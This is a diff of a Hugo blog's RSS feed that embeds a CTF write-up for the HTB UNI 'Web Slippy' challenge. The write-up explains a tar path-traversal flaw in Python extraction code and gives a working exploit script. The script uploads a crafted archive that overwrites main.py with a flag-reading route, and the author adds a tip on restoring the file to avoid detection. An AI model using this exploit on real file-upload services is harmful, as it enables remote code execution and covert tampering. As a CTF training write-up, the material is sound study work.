@@ -1,19 +1,175 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>CTF-Writeups on </title>
-    <link>/tags/ctf-writeups/</link>
-    <description>Recent content in CTF-Writeups on </description>
-    <generator>Hugo</generator>
+    <title>CTF-Writeups on TeXify3</title>
+    <link>http://localhost:1313/hugo-texify3/tags/ctf-writeups/</link>
+    <description>Recent content in CTF-Writeups on TeXify3</description>
+    <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Mon, 22 Nov 2021 15:16:32 -0500</lastBuildDate>
-    <atom:link href="/tags/ctf-writeups/index.xml" rel="self" type="application/rss+xml" />
+    <managingEditor>michael@michaelneuper.com (Michael Neuper)</managingEditor>
+    <webMaster>michael@michaelneuper.com (Michael Neuper)</webMaster>
+    <lastBuildDate>Mon, 22 Nov 2021 15:16:32 -0500</lastBuildDate><atom:link href="http://localhost:1313/hugo-texify3/tags/ctf-writeups/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HTB UNI CTF : Web Slippy</title>
-      <link>/posts/writeups/htb-uni-ctf/web-slippy/</link>
+      <link>http://localhost:1313/hugo-texify3/posts/writeups/htb-uni-ctf/web-slippy/</link>
       <pubDate>Mon, 22 Nov 2021 15:16:32 -0500</pubDate>
-      <guid>/posts/writeups/htb-uni-ctf/web-slippy/</guid>
-      <description>Analyze For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.&#xA;The directory tree of the source code as follow.&#xA;./challenge ├── application │ ├── blueprints │ │ └── routes.py │ ├── config.py │ ├── main.py │ ├── static │ │ ├── archives │ │ ├── css │ │ │ ├── bootstrap.</description>
+      <author>michael@michaelneuper.com (Michael Neuper)</author>
+      <guid>http://localhost:1313/hugo-texify3/posts/writeups/htb-uni-ctf/web-slippy/</guid>
+      <description>&lt;p&gt;&lt;img src=&#34;http://localhost:1313/hugo-texify3/web_slippy/ChallengeDescription.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;analyze&#34;&gt;Analyze&lt;/h2&gt;
+&lt;p&gt;For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/hugo-texify3/web_slippy/Website.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The directory tree of the source code as follow.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./challenge
+├── application
+│   ├── blueprints
+│   │   └── routes.py
+│   ├── config.py
+│   ├── main.py
+│   ├── static
+│   │   ├── archives
+│   │   ├── css
+│   │   │   ├── bootstrap.min.css
+│   │   │   └── main.css
+│   │   ├── images
+│   │   │   ├── card-body2.png
+│   │   │   ├── card-btm2.png
+│   │   │   ├── card-top2.png
+│   │   │   └── upload-doc.png
+│   │   └── js
+│   │       ├── bootstrap.min.js
+│   │       ├── jquery-3.6.0.min.js
+│   │       ├── main.js
+│   │       └── TweenMax.min.js
+│   ├── templates
+│   │   └── index.html
+│   └── util.py
+├── flag
+└── run.py
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can see that the flag file is in the same directory as the run.py&lt;/p&gt;
+&lt;p&gt;So I am assuming that we have to figure out a way to read the flag file.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Util.py&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import functools, tarfile, tempfile, os
+from application import main
+
+generate = lambda x: os.urandom(x).hex()
+
+def extract_from_archive(file):
+    tmp  = tempfile.gettempdir()
+    path = os.path.join(tmp, file.filename)
+    file.save(path)
+
+    if tarfile.is_tarfile(path):
+        tar = tarfile.open(path, &amp;#39;r:gz&amp;#39;)
+        tar.extractall(tmp)
+
+        extractdir = f&amp;#39;{main.app.config[&amp;#34;UPLOAD_FOLDER&amp;#34;]}/{generate(15)}&amp;#39;
+        os.makedirs(extractdir, exist_ok=True)
+
+        extracted_filenames = []
+
+        for tarinfo in tar:
+            name = tarinfo.name
+            if tarinfo.isreg():
+                filename = f&amp;#39;{extractdir}/{name}&amp;#39;
+                os.rename(os.path.join(tmp, name), filename)
+                extracted_filenames.append(filename)
+                continue
+
+            os.makedirs(f&amp;#39;{extractdir}/{name}&amp;#39;, exist_ok=True)
+
+        tar.close()
+        return extracted_filenames
+
+    return False
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the code that is used to extract the given tar file.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s examine this code a bit further.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;generate = lambda x: os.urandom(x).hex()
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It is used to generate a random number of the length x. Another way of writing this would be.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;def generate(x):
+	return os.urandom(x).hex()
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;		extractdir = f&amp;#39;{main.app.config[&amp;#34;UPLOAD_FOLDER&amp;#34;]}/{generate(15)}&amp;#39;
+        os.makedirs(extractdir, exist_ok=True)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So here they use the generate to create a new folder to avoid files to collide when they have same name.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;➜  application git:(main) ✗ cat config.py
+
+from application.util import generate
+from os.path import abspath
+
+class Config(object):
+    SECRET_KEY = generate(50)
+    UPLOAD_FOLDER = &amp;#39;/app/application/static/archives&amp;#39;
+
+class ProductionConfig(Config):
+    pass
+
+class DevelopmentConfig(Config):
+    DEBUG = True
+
+class TestingConfig(Config):
+    TESTING = True
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can see that the tar file gets extracted at path &lt;code&gt;/app/application/static/archives/{somerandom}/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We also know that the flag is at &lt;code&gt;/app/&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;recon&#34;&gt;Recon&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://bugzilla.redhat.com/show_bug.cgi?id=263261&#34;&gt;https://bugzilla.redhat.com/show_bug.cgi?id=263261&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;By searching up on the internet, I found this cool bug in the tar file library in python.&lt;/p&gt;
+&lt;p&gt;After reading this for the first time, I thought I could use the &lt;code&gt;../../../flag&lt;/code&gt; as my file name and the download the flag. Seems pretty simple right?&lt;/p&gt;
+&lt;p&gt;Well Not really.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;os.rename()&lt;/code&gt; overrides the existing file in the directory.&lt;/p&gt;
+&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
+&lt;p&gt;For the exploit, I thought of overriding the &lt;code&gt;main.py&lt;/code&gt; file and adding a API endpoint that opens the flag and returns it.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rom flask import Flask, jsonify
+from application.blueprints.routes import web, api
+
+app = Flask(__name__)
+app.config.from_object(&amp;#39;application.config.Config&amp;#39;)
+
+app.register_blueprint(web, url_prefix=&amp;#39;/&amp;#39;)
+app.register_blueprint(api, url_prefix=&amp;#39;/api&amp;#39;)
+
+@app.errorhandler(404)
+def not_found(error):
+    return jsonify({&amp;#39;error&amp;#39;: &amp;#39;Not Found&amp;#39;}), 404
+
+@app.errorhandler(403)
+def forbidden(error):
+    return jsonify({&amp;#39;error&amp;#39;: &amp;#39;Not Allowed&amp;#39;}), 403
+
+@app.errorhandler(400)
+def bad_request(error):
+    return jsonify({&amp;#39;error&amp;#39;: &amp;#39;Bad Request&amp;#39;}), 400
+
+@app.route(&amp;#39;/flag&amp;#39;)
+def flag():
+    file = open(&amp;#39;/app/flag&amp;#39;, &amp;#39;r&amp;#39;)
+    return f.read()
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is what the new main file will look like.&lt;/p&gt;
+&lt;p&gt;If we wanted to be undetected, we can upload the actual main.py file after we get the flag, so that they won&amp;rsquo;t figure out where we got the flag from.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import tarfile, requests
+
+zpath = &amp;#34;../../../main.py&amp;#34;
+
+
+tf = tarfile.open(&amp;#34;payload.tar.gz&amp;#34;, &amp;#34;w:gz&amp;#34;)
+tf.add(&amp;#39;main.py&amp;#39;, zpath)
+tf.close()
+
+
+
+url = &amp;#34;http://64.227.36.32:32187/api/unslippy&amp;#34;
+
+files = {&amp;#34;file&amp;#34;: open(&amp;#39;payload.tar.gz&amp;#39;, &amp;#39;rb&amp;#39;)}
+
+r = requests.post(url, files=files)
+
+flag = requests.get(&amp;#34;http://64.227.36.32:32187/flag&amp;#34;)
+
+print(flag.text)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I wrote a simple script that will take the main.py file and add directory trasverasl stuffs infront of the file, and creates a tar.gz file.&lt;/p&gt;
+&lt;p&gt;Then it will upload the file to the server, later it will use the /flag endpoint to extract the flag.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTB{i_slipped_my_way_to_rce}
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
+    
   </channel>
 </rss>
